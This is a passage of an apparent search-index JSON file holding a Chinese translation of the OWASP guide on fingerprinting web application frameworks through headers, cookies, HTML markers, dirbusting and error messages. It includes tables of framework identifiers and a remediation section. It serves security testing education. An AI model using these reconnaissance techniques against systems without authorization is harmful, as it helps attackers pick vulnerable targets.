\u5e94\u7528\u7a0b\u5e8f\u90fd\u5df2\u7ecf\u5f00\u53d1\u51fa\u6765\u4e86\u3002\u968f\u7740\u4e16\u754c\u5404\u5730\u79ef\u6781\u5f00\u53d1\u548c\u90e8\u7f72\u7684\u5927\u91cf\u514d\u8d39\u548c\u5f00\u6e90\u8f6f\u4ef6\u9879\u76ee\uff0c\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u5f88\u53ef\u80fd\u4f1a\u9762\u4e34\u4e00\u4e2a\u5b8c\u5168\u6216\u90e8\u5206\u4f9d\u8d56\u4e8e\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u6846\u67b6\uff08\u4f8b\u5982 WordPress \u3001phpBB\u3001Mediawiki \u7b49\uff09\u3002\u4e86\u89e3\u6b63\u5728\u6d4b\u8bd5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u5bf9\u6d4b\u8bd5\u8fc7\u7a0b\u6709\u5f88\u5927\u5e2e\u200b\u200b\u52a9\uff0c\u4e5f\u5c06\u5927\u5927\u51cf\u5c11\u6d4b\u8bd5\u671f\u95f4\u6240\u9700\u7684\u5de5\u4f5c\u91cf\u3002\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u4f17\u6240\u5468\u77e5\u7684 HTML \u6807\u5934\u3001cookie \u548c\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u6765\u8bc6\u522b\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u5927\u591a\u6570 Web \u6846\u67b6\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u90fd\u6709\u51e0\u4e2a\u6807\u8bb0\uff0c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u8bc6\u522b\u5b83\u4eec\u3002\u8fd9\u57fa\u672c\u4e0a\u662f\u6240\u6709\u81ea\u52a8\u5de5\u5177\u6240\u505a\u7684\uff0c\u5b83\u4eec\u4ece\u9884\u5b9a\u4e49\u7684\u4f4d\u7f6e\u5bfb\u627e\u6807\u8bb0\uff0c\u7136\u540e\u5c06\u5176\u4e0e\u5df2\u77e5\u7b7e\u540d\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u3002\u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u51c6\u786e\u6027\uff0c\u901a\u5e38\u4f7f\u7528\u591a\u4e2a\u6807\u8bb0\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u7ec4\u4ef6\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_4","title":"\u9ed1\u76d2\u6d4b\u8bd5","text":"<p>\u4e3a\u4e86\u8bc6\u522b\u6846\u67b6\u6216\u7ec4\u4ef6\uff0c\u9700\u8981\u8003\u8651\u51e0\u4e2a\u5e38\u89c1\u7684\u4f4d\u7f6e\uff1a</p> <ul> <li>HTTP \u6807\u5934</li> <li>\u997c\u5e72</li> <li>\u7f51\u9875\u6e90\u4ee3\u7801</li> <li>\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939</li> <li>\u6587\u4ef6\u6269\u5c55\u540d</li> <li>\u9519\u8bef\u8baf\u606f</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#http","title":"HTTP \u6807\u5934","text":"<p>\u8bc6\u522b Web \u6846\u67b6\u7684\u6700\u57fa\u672c\u5f62\u5f0f\u662f\u67e5\u770b<code>X-Powered-By</code>HTTP \u54cd\u5e94\u6807\u5934\u4e2d\u7684\u5b57\u6bb5\u3002\u8bb8\u591a\u5de5\u5177\u90fd\u53ef\u4ee5\u7528\u6765\u5bf9\u76ee\u6807\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u6700\u7b80\u5355\u7684\u662fnetcat\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42-\u54cd\u5e94\uff1a</p> <pre><code>$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n</code></pre> <p>\u4ece<code>X-Powered-By</code>\u73b0\u573a\uff0c\u6211\u4eec\u4e86\u89e3\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5f88\u53ef\u80fd\u662f<code>Mono</code>.\u00a0\u7136\u800c\uff0c\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u7b80\u5355\u5feb\u6377\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u662f\u5728 100% \u7684\u60c5\u51b5\u4e0b\u90fd\u6709\u6548\u3002<code>X-Powered-By</code>\u53ef\u4ee5\u901a\u8fc7\u9002\u5f53\u7684\u914d\u7f6e\u8f7b\u677e\u7981\u7528\u6807\u5934\u3002\u8fd8\u6709\u51e0\u79cd\u6280\u672f\u53ef\u4ee5\u8ba9\u7f51\u7ad9\u6df7\u6dc6 HTTP \u6807\u5934\uff08\u8bf7\u53c2\u9605\u4fee\u590d\u90e8\u5206\u4e2d\u7684\u793a\u4f8b\uff09\u3002<code>nginx</code>\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6ce8\u610f\u5230\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u7248\u672c\u6765\u63d0\u4f9b\u5185\u5bb9\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u540c\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u9519\u8fc7<code>X-Powered-By</code>\u6807\u5934\u6216\u83b7\u5f97\u5982\u4e0b\u6240\u793a\u7684\u7b54\u6848\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n</code></pre> <p>\u6709\u65f6\u4f1a\u6709\u66f4\u591a\u7684 HTTP \u6807\u5934\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6839\u636e HTTP \u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230<code>X-Powered-By</code>header \u4e2d\u5305\u542b PHP \u7248\u672c\u3002\u7136\u800c\uff0c<code>X-Generator</code>\u6807\u5934\u6307\u51fa\u4f7f\u7528\u7684\u6846\u67b6\u5b9e\u9645\u4e0a\u662f<code>Swiftlet</code>\uff0c\u8fd9\u6709\u52a9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6269\u5c55\u4ed6\u4eec\u7684\u653b\u51fb\u5411\u91cf\u3002\u6267\u884c\u6307\u7eb9\u8bc6\u522b\u65f6\uff0c\u8bf7\u4ed4\u7ec6\u68c0\u67e5\u6bcf\u4e2a HTTP \u6807\u5934\u662f\u5426\u5b58\u5728\u6b64\u7c7b\u6cc4\u6f0f\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#cookie","title":"Cookie","text":"<p>\u786e\u5b9a\u5f53\u524d Web \u6846\u67b6\u7684\u53e6\u4e00\u79cd\u7c7b\u4f3c\u4e14\u66f4\u53ef\u9760\u7684\u65b9\u6cd5\u662f\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 cookie\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42\uff1a</p> <p> \u56fe 4.1.8-7\uff1aCakephp HTTP \u8bf7\u6c42</p> <p>cookie<code>CAKEPHP</code>\u5df2\u81ea\u52a8\u8bbe\u7f6e\uff0c\u5b83\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u6846\u67b6\u7684\u4fe1\u606f\u3002Cookie\u90e8\u5206\u5217\u51fa\u4e86\u5e38\u89c1\u7684 cookie \u540d\u79f0\u3002\u4f9d\u8d56\u8fd9\u79cd\u8bc6\u522b\u673a\u5236\u4ecd\u7136\u5b58\u5728\u5c40\u9650\u6027\u2014\u2014\u53ef\u4ee5\u66f4\u6539 cookie \u7684\u540d\u79f0\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u9009\u5b9a\u7684<code>CakePHP</code>\u6846\u67b6\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u914d\u7f6e\u5b8c\u6210\uff08\u6458\u81ea<code>core.php</code>\uff09\uff1a</p> <pre><code>/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link http://php.net/session_name\n*/\nConfigure::write('Session.cookie', 'CAKEPHP');\n</code></pre> <p>\u4f46\u662f\uff0c\u4e0e\u6807\u5934\u7684\u66f4\u6539\u76f8\u6bd4\uff0c\u8fdb\u884c\u8fd9\u4e9b\u66f4\u6539\u7684\u53ef\u80fd\u6027\u8f83\u5c0f<code>X-Powered-By</code>\uff0c\u56e0\u6b64\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u79cd\u8bc6\u522b\u65b9\u6cd5\u66f4\u53ef\u9760\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#html","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u6b64\u6280\u672f\u57fa\u4e8e\u5728 HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u67e5\u627e\u67d0\u4e9b\u6a21\u5f0f\u3002\u4eba\u4eec\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u5f88\u591a\u4fe1\u606f\u6765\u5e2e\u52a9\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u7279\u5b9a\u7ec4\u4ef6\u3002\u4e00\u79cd\u5e38\u89c1\u7684\u6807\u8bb0\u662f\u76f4\u63a5\u5bfc\u81f4\u6846\u67b6\u6cc4\u9732\u7684 HTML \u6ce8\u91ca\u3002\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u67d0\u4e9b\u7279\u5b9a\u4e8e\u6846\u67b6\u7684\u8def\u5f84\uff0c\u5373\u6307\u5411\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 CSS \u6216 JS \u6587\u4ef6\u5939\u7684\u94fe\u63a5\u3002\u6700\u540e\uff0c\u7279\u5b9a\u7684\u811a\u672c\u53d8\u91cf\u4e5f\u53ef\u80fd\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002</p> <p>\u4ece\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u63d0\u5230\u7684\u6807\u8bb0\u8f7b\u677e\u4e86\u89e3\u4f7f\u7528\u7684\u6846\u67b6\u53ca\u5176\u7248\u672c\u3002\u6ce8\u91ca\u3001\u5177\u4f53\u8def\u5f84\u548c\u811a\u672c\u53d8\u91cf\u90fd\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5feb\u901f\u786e\u5b9aZK\u6846\u67b6\u7684\u5b9e\u4f8b\u3002</p> <p> \u56fe 4.1.8-2\uff1aZK \u6846\u67b6 HTML \u6e90\u4ee3\u7801\u793a\u4f8b</p> <p>\u6b64\u7c7b\u4fe1\u606f\u901a\u5e38\u4f4d\u4e8e<code>&lt;head&gt;</code>HTTP \u54cd\u5e94\u90e8\u5206\u3001<code>&lt;meta&gt;</code>\u6807\u8bb0\u4e2d\u6216\u9875\u9762\u672b\u5c3e\u3002\u7136\u800c\uff0c\u5e94\u8be5\u5206\u6790\u6574\u4e2a\u54cd\u5e94\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u7528\u4e8e\u5176\u4ed6\u76ee\u7684\uff0c\u4f8b\u5982\u68c0\u67e5\u5176\u4ed6\u6709\u7528\u7684\u8bc4\u8bba\u548c\u9690\u85cf\u5b57\u6bb5\u3002\u6709\u65f6\uff0cWeb \u5f00\u53d1\u4eba\u5458\u4e0d\u592a\u5173\u5fc3\u9690\u85cf\u6709\u5173\u6240\u7528\u6846\u67b6\u6216\u7ec4\u4ef6\u7684\u4fe1\u606f\u3002\u4ecd\u7136\u6709\u53ef\u80fd\u5728\u9875\u9762\u5e95\u90e8\u5076\u7136\u53d1\u73b0\u7c7b\u4f3c\u8fd9\u6837\u7684\u5185\u5bb9\uff1a</p> <p> \u56fe 4.1.8-3\uff1aBanshee \u5e95\u90e8\u9875\u9762</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_5","title":"\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939","text":"<p>\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6781\u5927\u5730\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u9ad8\u7cbe\u5ea6\u5730\u8bc6\u522b\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u3002\u6bcf\u4e2a Web \u7ec4\u4ef6\u5728\u670d\u52a1\u5668\u4e0a\u90fd\u6709\u81ea\u5df1\u7279\u5b9a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7ed3\u6784\u3002\u5df2\u7ecf\u6ce8\u610f\u5230\uff0c\u53ef\u4ee5\u4ece HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u7279\u5b9a\u8def\u5f84\uff0c\u4f46\u6709\u65f6\u5b83\u4eec\u5e76\u6ca1\u6709\u660e\u786e\u5730\u663e\u793a\u5728\u90a3\u91cc\uff0c\u800c\u662f\u4ecd\u7136\u9a7b\u7559\u5728\u670d\u52a1\u5668\u4e0a\u3002</p> <p>\u4e3a\u4e86\u53d1\u73b0\u5b83\u4eec\uff0c\u4f7f\u7528\u4e86\u4e00\u79cd\u79f0\u4e3a\u5f3a\u5236\u6d4f\u89c8\u6216\u201cdirbusting\u201d\u7684\u6280\u672f\u3002Dirbusting \u662f\u66b4\u529b\u7834\u89e3\u5177\u6709\u5df2\u77e5\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u540d\u7684\u76ee\u6807\uff0c\u5e76\u76d1\u89c6 HTTP \u54cd\u5e94\u4ee5\u679a\u4e3e\u670d\u52a1\u5668\u5185\u5bb9\u3002\u6b64\u4fe1\u606f\u65e2\u53ef\u7528\u4e8e\u67e5\u627e\u9ed8\u8ba4\u6587\u4ef6\u548c\u653b\u51fb\u5b83\u4eec\uff0c\u4e5f\u53ef\u7528\u4e8e\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002Dirbusting \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b8c\u6210\uff0c\u4e0b\u9762\u7684\u793a\u4f8b\u663e\u793a\u4e86\u5728 Burp Suite \u7684\u5b9a\u4e49\u5217\u8868\u548c\u5165\u4fb5\u8005\u529f\u80fd\u7684\u5e2e\u52a9\u4e0b\uff0c\u5bf9 WordPress \u652f\u6301\u7684\u76ee\u6807\u8fdb\u884c\u6210\u529f\u7684 dirbusting \u653b\u51fb\u3002</p> <p> \u56fe 4.1.8-4\uff1a\u4f7f\u7528 Burp \u8fdb\u884c\u5206\u53d1</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u5b9a\u4e8e WordPress \u7684\u6587\u4ef6\u5939\uff08\u4f8b\u5982\uff0c<code>/wp-includes/</code>\u548c<code>/wp-admin/</code>\uff09 \uff0c\u00a0<code>/wp-content/</code>HTTP \u54cd\u5e94\u5206\u522b\u4e3a 403\uff08\u7981\u6b62\u8bbf\u95ee\uff09\u3001302\uff08\u627e\u5230\uff0c\u91cd\u5b9a\u5411\u5230\u00a0<code>wp-login.php</code>\uff09\u548c 200\uff08\u786e\u5b9a\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6307\u6807\uff0c\u8868\u660e\u76ee\u6807\u662f\u7531 WordPress \u9a71\u52a8\u7684\u3002\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u53ef\u4ee5 dirbust \u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u63d2\u4ef6\u6587\u4ef6\u5939\u53ca\u5176\u7248\u672c\u3002\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5178\u578b\u7684 Drupal \u63d2\u4ef6\u7684 CHANGELOG \u6587\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u5e76\u63ed\u793a\u4e86\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684\u63d2\u4ef6\u7248\u672c\u3002</p> <p> \u56fe 4.1.8-5\uff1aDrupal Botcha \u62ab\u9732</p> <p>\u63d0\u793a\uff1a\u5728\u5f00\u59cb dirbusting \u4e4b\u524d\uff0c\u8bf7\u5148\u68c0\u67e5<code>robots.txt</code>\u6587\u4ef6\u3002\u6709\u65f6\u4e5f\u53ef\u4ee5\u5728\u90a3\u91cc\u627e\u5230\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u5939\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002<code>robots.txt</code>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u6b64\u7c7b\u6587\u4ef6\u7684\u793a\u4f8b\u3002</p> <p> \u56fe 4.1.8-6\uff1a\u673a\u5668\u4eba\u4fe1\u606f\u516c\u5f00</p> <p>\u6bcf\u4e2a\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u90fd\u4e0d\u540c\u3002\u5982\u679c\u786e\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u662f\u5f00\u6e90\u7684\uff0c\u5219\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u8bbe\u7f6e\u4e34\u65f6\u5b89\u88c5\u53ef\u80fd\u6709\u4ef7\u503c\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e86\u89e3\u6240\u63d0\u4f9b\u7684\u57fa\u7840\u8bbe\u65bd\u6216\u529f\u80fd\uff0c\u4ee5\u53ca\u670d\u52a1\u5668\u4e0a\u53ef\u80fd\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u5df2\u7ecf\u5b58\u5728\u51e0\u4e2a\u4e0d\u9519\u7684\u6587\u4ef6\u5217\u8868\uff1b\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\u662f\u53ef\u9884\u6d4b\u6587\u4ef6/\u6587\u4ef6\u5939\u7684 FuzzDB \u8bcd\u8868\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_6","title":"\u6587\u4ef6\u6269\u5c55\u540d","text":"<p>URL \u53ef\u80fd\u5305\u542b\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u8fd9\u4e5f\u6709\u52a9\u4e8e\u8bc6\u522b\u7f51\u7edc\u5e73\u53f0\u6216\u6280\u672f\u3002</p> <p>\u4f8b\u5982\uff0cOWASP wiki \u4f7f\u7528 PHP\uff1a</p> <pre><code>https://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&amp;action=edit&amp;section=4\n</code></pre> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 Web \u6587\u4ef6\u6269\u5c55\u540d\u548c\u76f8\u5173\u6280\u672f\uff1a</p> <ul> <li><code>.php</code>\u2013 PHP</li> <li><code>.aspx</code>\u2013 \u5fae\u8f6f ASP.NET</li> <li><code>.jsp</code>\u2013 Java \u670d\u52a1\u5668\u9875\u9762</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_7","title":"\u9519\u8bef\u4fe1\u606f","text":"<p>\u5982\u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\u6240\u793a\uff0c\u5217\u51fa\u7684\u6587\u4ef6\u7cfb\u7edf\u8def\u5f84\u6307\u5411\u4f7f\u7528 WordPress (\u00a0<code>wp-content</code>)\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u77e5\u9053 WordPress \u662f\u57fa\u4e8e PHP \u7684 (\u00a0<code>functions.php</code>)\u3002</p> <p> \u56fe 4.1.8-7\uff1aWordPress \u89e3\u6790\u9519\u8bef</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_8","title":"\u901a\u7528\u6807\u8bc6\u7b26","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#cookie_1","title":"Cookie","text":"<p>Framework Cookie name</p> <p>Zope zope3</p> <p>CakePHP cakephp</p> <p>Kohana kohanasession</p> <p>Laravel laravel_session</p> <p>phpBB phpbb3_</p> <p>WordPress wp-settings</p> <p>1C-Bitrix BITRIX_</p> <p>AMPcms AMP</p> <p>Django CMS django</p> <p>DotNetNuke DotNetNukeAnonymous</p> <p>e107 e107_tz</p> <p>EPiServer EPiTrace, EPiServer</p> <p>Graffiti CMS graffitibot</p> <p>Hotaru CMS hotaru_mobile</p> <p>ImpressCMS ICMSession</p> <p>Indico MAKACSESSION</p> <p>InstantCMS InstantCMS[logdate]</p> <p>Kentico CMS CMSPreferredCulture</p> <p>MODx SN4[12symb]</p> <p>TYPO3 fe_typo_user</p> <p>Dynamicweb Dynamicweb</p> <p>LEPTON lep[some_numeric_value]+sessionid</p> <p>Wix Domain=.wix.com</p> <p>VIVVO VivvoSessionId</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#html_1","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u5e94\u7528</p> <p>\u5173\u952e\u8bcd</p> <p>WordPress\u7684</p> <p><code>&lt;meta name=\"generator\" content=\"WordPress 3.9.2\" /&gt;</code></p> <p>phpBB</p> <p><code>&lt;body id=\"phpbb\"</code></p> <p>Mediawiki</p> <p><code>&lt;meta name=\"generator\" content=\"MediaWiki 1.21.9\" /&gt;</code></p> <p>Joomla</p> <p><code>&lt;meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" /&gt;</code></p> <p>Drupal</p> <p><code>&lt;meta name=\"Generator\" content=\"Drupal 7 (http://drupal.org)\" /&gt;</code></p> <p>DotNetNuke</p> <p><code>DNN Platform - [http://www.dnnsoftware.com](http://www.dnnsoftware.com)</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_9","title":"\u4e00\u822c\u6807\u8bb0","text":"<ul> <li><code>%framework_name%</code></li> <li><code>powered by</code></li> <li><code>built upon</code></li> <li><code>running</code></li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_10","title":"\u7279\u5b9a\u6807\u8bb0","text":"<p>\u6846\u67b6</p> <p>\u5173\u952e\u8bcd</p> <p>Adobe ColdFusion</p> <p><code>&lt;!-- START headerTags.cfm</code></p> <p>Microsoft ASP.NET</p> <p><code>__VIEWSTATE</code></p> <p>ZK</p> <p><code>&lt;!-- ZK</code></p> <p>Business Catalyst</p> <p><code>&lt;!-- BC_OBNW --&gt;</code></p> <p>Indexhibit</p> <p><code>ndxz-studio</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_11","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u53ef\u4ee5\u52aa\u529b\u4f7f\u7528\u4e0d\u540c\u7684 cookie \u540d\u79f0\uff08\u901a\u8fc7\u66f4\u6539\u914d\u7f6e\uff09\u3001\u9690\u85cf\u6216\u66f4\u6539\u6587\u4ef6/\u76ee\u5f55\u8def\u5f84\uff08\u901a\u8fc7\u91cd\u5199\u6216\u6e90\u4ee3\u7801\u66f4\u6539\uff09\u3001\u5220\u9664\u5df2\u77e5\u6807\u5934\u7b49\uff0c\u4f46\u8fd9\u4e9b\u52aa\u529b\u5f52\u7ed3\u4e3a\u201c\u901a\u8fc7\u6a21\u7cca\u5b9e\u73b0\u5b89\u5168\u201d\u3002\u7cfb\u7edf\u6240\u6709\u8005/\u7ba1\u7406\u5458\u5e94\u8be5\u8ba4\u8bc6\u5230\uff0c\u8fd9\u4e9b\u52aa\u529b\u53ea\u4f1a\u51cf\u6162\u6700\u57fa\u672c\u7684\u5bf9\u624b\u3002\u65f6\u95f4/\u7cbe\u529b\u53ef\u4ee5\u66f4\u597d\u5730\u7528\u4e8e\u5229\u76ca\u76f8\u5173\u8005\u610f\u8bc6\u548c\u89e3\u51b3\u65b9\u6848\u7ef4\u62a4\u6d3b\u52a8\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1